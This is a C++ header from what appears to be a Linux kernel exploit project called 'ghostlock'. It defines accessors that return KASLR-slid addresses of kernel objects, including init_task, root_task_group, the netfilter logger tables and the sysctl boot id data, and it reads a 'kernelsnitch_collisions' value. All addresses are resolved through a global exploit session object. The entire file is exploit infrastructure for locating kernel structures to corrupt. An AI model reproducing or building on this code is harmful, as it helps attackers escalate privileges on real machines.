#ifndef GHOSTLOCK_PROFILE_ACCESSORS_HPP
#define GHOSTLOCK_PROFILE_ACCESSORS_HPP

#include <cstdint>

#include "kernel/runtime_struct_offsets.h"

namespace ghostlock::profile {
    inline uint32_t kernelsnitch_collisions() {
        return symbol_u32(&kernel_offsets::kernelsnitch_collisions, 4);
    }

    inline uintptr_t slide_nfulnl_logger() {
        return ghostlock::session::g_exploit_session.addresses.data_alias(slide_nfulnl_logger_image());
    }

    inline uintptr_t slide_loggers_0_1() {
        return ghostlock::session::g_exploit_session.addresses.data_alias(slide_loggers_0_1_image());
    }

    inline uintptr_t slide_random_boot_id_data() {
        return ghostlock::session::g_exploit_session.addresses.data_alias(slide_random_boot_id_data_image());
    }

    inline uintptr_t slide_init_task() {
        return ghostlock::session::g_exploit_session.addresses.data_alias(slide_init_task_image());
    }

    inline uintptr_t slide_root_task_group() {
        return ghostlock::session::g_exploit_session.addresses.data_alias(slide_root_task_group_image());
    }

    inline uintptr_t slide_sysctl_bootid() {
        return ghostlock::session::g_exploit_session.addresses.data_alias(slide_sysctl_bootid_image());
    }
} // namespace ghostlock::profile

#endif
